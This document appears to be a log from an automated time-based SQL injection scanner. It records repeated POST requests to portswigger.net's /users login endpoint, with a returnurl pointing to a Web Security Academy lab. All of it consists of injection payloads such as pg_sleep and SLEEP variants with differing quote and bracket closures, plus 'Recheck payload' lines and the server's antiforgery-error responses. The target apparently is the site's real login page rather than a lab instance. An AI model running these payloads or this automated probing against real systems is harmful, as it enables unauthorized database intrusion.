+2024-08-16 22:06:10,170 - INFO - [22:06:10] Payload testing: 1 or pg_sleep(5)--
+2024-08-16 22:06:10,178 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:11,795 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:12,339 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:12,361 - INFO - [22:06:12] Payload testing: 1 or pg_sleep(5)--
+2024-08-16 22:06:12,370 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:13,926 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:14,493 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:14,519 - INFO - [22:06:14] Payload testing: " or pg_sleep(5)--
+2024-08-16 22:06:14,530 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:16,260 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:16,872 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:16,897 - INFO - [22:06:16] Payload testing: " or pg_sleep(5)--
+2024-08-16 22:06:16,907 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:18,512 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:19,075 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:19,093 - INFO - [22:06:19] Payload testing: " or pg_sleep(5)--
+2024-08-16 22:06:19,102 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:20,786 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:21,346 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:21,359 - INFO - [22:06:21] Payload testing: ' or pg_sleep(5)--
+2024-08-16 22:06:21,370 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:22,908 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:23,489 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:23,507 - INFO - [22:06:23] Payload testing: ' or pg_sleep(5)--
+2024-08-16 22:06:23,518 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:25,127 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:25,807 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:25,821 - INFO - [22:06:25] Payload testing: ' or pg_sleep(5)--
+2024-08-16 22:06:25,829 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:27,487 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:28,093 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:28,244 - INFO - [22:06:28] Payload testing: 1) or pg_sleep(5)--
+2024-08-16 22:06:28,254 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:29,932 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:30,565 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:30,589 - INFO - [22:06:30] Payload testing: 1) or pg_sleep(5)--
+2024-08-16 22:06:30,606 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:32,393 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:33,155 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:33,165 - INFO - [22:06:33] Payload testing: 1) or pg_sleep(5)--
+2024-08-16 22:06:33,176 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:35,234 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:35,859 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:35,890 - INFO - [22:06:35] Payload testing: ") or pg_sleep(5)--
+2024-08-16 22:06:35,899 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:37,498 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:38,058 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:38,076 - INFO - [22:06:38] Payload testing: ") or pg_sleep(5)--
+2024-08-16 22:06:38,083 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:39,722 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:40,264 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:40,307 - INFO - [22:06:40] Payload testing: ") or pg_sleep(5)--
+2024-08-16 22:06:40,334 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:42,122 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:42,744 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:42,753 - INFO - [22:06:42] Payload testing: ') or pg_sleep(5)--
+2024-08-16 22:06:42,767 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:44,393 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:44,979 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:45,008 - INFO - [22:06:44] Payload testing: ') or pg_sleep(5)--
+2024-08-16 22:06:45,028 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:46,819 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:47,443 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:47,458 - INFO - [22:06:47] Payload testing: ') or pg_sleep(5)--
+2024-08-16 22:06:47,468 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:49,190 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:49,541 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:49,838 - INFO - [22:06:49] Payload testing: 1)) or pg_sleep(5)--
+2024-08-16 22:06:49,849 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:51,699 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:53,830 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:53,955 - INFO - [22:06:53] Payload testing: 1)) or pg_sleep(5)--
+2024-08-16 22:06:53,978 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:55,787 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:56,600 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:56,704 - INFO - [22:06:56] Payload testing: 1)) or pg_sleep(5)--
+2024-08-16 22:06:56,718 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:06:58,673 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:06:59,827 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:06:59,849 - INFO - [22:06:59] Payload testing: ")) or pg_sleep(5)--
+2024-08-16 22:06:59,864 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:01,624 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:02,226 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:02,249 - INFO - [22:07:02] Payload testing: ")) or pg_sleep(5)--
+2024-08-16 22:07:02,260 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:07,816 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:08,787 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:08,849 - INFO - [22:07:08] Payload testing: ")) or pg_sleep(5)--
+2024-08-16 22:07:08,861 - INFO - [!] Recheck payload: ")) or pg_sleep(10)--
+2024-08-16 22:07:08,865 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:10,940 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:12,306 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:12,342 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:16,226 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:16,788 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:17,120 - INFO - [22:07:17] Payload testing: ')) or pg_sleep(5)--
+2024-08-16 22:07:17,129 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:19,664 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:20,680 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:21,405 - INFO - [22:07:21] Payload testing: ')) or pg_sleep(5)--
+2024-08-16 22:07:21,413 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:23,198 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:23,827 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:23,947 - INFO - [22:07:23] Payload testing: ')) or pg_sleep(5)--
+2024-08-16 22:07:23,960 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:25,993 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:26,616 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:26,635 - INFO - [22:07:26] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-08-16 22:07:26,643 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:28,311 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:28,948 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:29,345 - INFO - [22:07:29] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-08-16 22:07:29,361 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:31,422 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:32,080 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:32,123 - INFO - [22:07:32] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+2024-08-16 22:07:32,135 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:34,067 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:35,053 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:36,636 - INFO - [22:07:36] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-08-16 22:07:36,651 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:38,313 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:38,969 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:39,357 - INFO - [22:07:39] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-08-16 22:07:39,371 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:41,628 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:42,643 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:43,281 - INFO - [22:07:43] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+2024-08-16 22:07:43,293 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:45,454 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:47,091 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:48,255 - INFO - [22:07:48] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-08-16 22:07:48,271 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:51,104 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:51,974 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:52,001 - INFO - [22:07:51] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-08-16 22:07:52,017 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:53,910 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:54,615 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:55,187 - INFO - [22:07:55] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+2024-08-16 22:07:55,203 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:57,048 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:07:57,806 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:07:57,857 - INFO - [22:07:57] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-08-16 22:07:57,869 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:07:59,632 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:00,558 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:00,573 - INFO - [22:08:00] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-08-16 22:08:00,582 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:02,315 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:03,179 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:03,606 - INFO - [22:08:03] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+2024-08-16 22:08:03,615 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:06,277 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:07,263 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:08,848 - INFO - [22:08:08] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-08-16 22:08:08,859 - INFO - [!] Recheck payload: AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)#
+2024-08-16 22:08:08,862 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:11,501 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:13,079 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:14,310 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:16,772 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:17,646 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:19,332 - INFO - [22:08:19] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-08-16 22:08:19,347 - INFO - [!] Recheck payload: AND (SELECT * FROM (SELECT(SLEEP(10)))nQIP)#
+2024-08-16 22:08:19,352 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:21,489 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:22,126 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:22,142 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:23,886 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:24,452 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:24,472 - INFO - [22:08:24] Payload testing: AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+2024-08-16 22:08:24,483 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:26,987 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:27,686 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:27,698 - INFO - [22:08:27] Payload testing: SLEEP(5)#
+2024-08-16 22:08:27,712 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:29,625 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:31,012 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:31,139 - INFO - [22:08:31] Payload testing: SLEEP(5)#
+2024-08-16 22:08:31,192 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
+2024-08-16 22:08:32,805 - DEBUG - https://portswigger.net:443 "POST /users?returnurl=%2Facademy%2Flabs%2Flaunch%2F8a7ec1665250f513f8ab3c341f7fcef5402a497d59fa90e673bfd30cd47ff766%3Freferrer%3D%252fweb-security%252fclickjacking%252flab-prefilled-form-input HTTP/1.1" 302 0
+2024-08-16 22:08:33,190 - DEBUG - https://portswigger.net:443 "GET /error/antiforgery HTTP/1.1" 200 None
+2024-08-16 22:08:33,455 - INFO - [22:08:33] Payload testing: SLEEP(5)#
+2024-08-16 22:08:33,467 - DEBUG - Starting new HTTPS connection (1): portswigger.net:443
